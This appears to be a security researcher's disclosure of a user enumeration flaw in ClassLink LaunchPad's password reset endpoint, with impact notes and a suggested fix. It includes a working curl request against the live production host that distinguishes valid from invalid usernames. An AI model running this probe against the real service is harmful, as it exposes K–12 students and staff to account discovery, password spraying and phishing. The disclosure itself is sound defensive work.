# ClassLink User Enumeration Vulnerability (Unauthenticated)

## Summary

A user enumeration vulnerability was discovered in the ClassLink LaunchPad password reset feature. By sending a `POST` request to the `/user/resetpassword/options` endpoint with different usernames, it is possible to distinguish valid accounts based on the application's response. This behavior allows attackers to enumerate valid usernames, which could be used in further attacks like credential stuffing or phishing.

## Affected System

- **Product:** ClassLink LaunchPad (SSO Portal)
- **Vendor:** ClassLink, Inc.
- **Tested As Of:** July 2025
- **Version:** Unknown (cloud-hosted)

## Vulnerability Details

POST /user/resetpassword/options

- A **valid username** returns a response containing a verification token.
- An **invalid username** returns: `"Password Recovery is not set up"`

This difference allows attackers to enumerate users without authentication.

curl -X POST 'https://launchpad.classlink.com/user/resetpassword/options' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'Origin: https://launchpad.classlink.com' \
  -H 'Referer: https://launchpad.classlink.com/resetpassword?scode=[schooldistrictname]' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Accept-Encoding: gzip, deflate, br' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-CH-UA: "Not)A;Brand";v="8", "Chromium";v="138"' \
  -H 'Sec-CH-UA-Mobile: ?0' \
  -H 'Sec-CH-UA-Platform: "OS"' \
  -H 'Cookie: _csrf=REDACTED; baseurl=%2FUSD497%2F; clsession=REDACTED; clresolution=1680x1050' \
  --data-urlencode 'username=asmith' \
  --data-urlencode 'code=[schooldistrictname]'


Valid username? (exists?) Expected: JSON response containing a verificationToken.

Invaludi username (doesn't exists?) Expected: "Password Recovery is not set up"

Impact

    Allows attackers to discover valid usernames.

    Increases risk of password spraying, credential stuffing, and phishing attacks.

    Particularly sensitive due to use in K–12 educational environments.

Mitigation

The server should return the same generic response for both valid and invalid usernames to prevent enumeration.
Disclosure

    Reported by: Hardly Strange (Security Researcher)
    
<img width="961" height="410" alt="classlink-enum-redacted" src="https://github.com/user-attachments/assets/533dbe86-0903-40a8-b373-db502a982666" />
<img width="1603" height="650" alt="user-enumeration-web-successful" src="https://github.com/user-attachments/assets/b20cde8c-955e-4166-8086-42eaeba22480" />



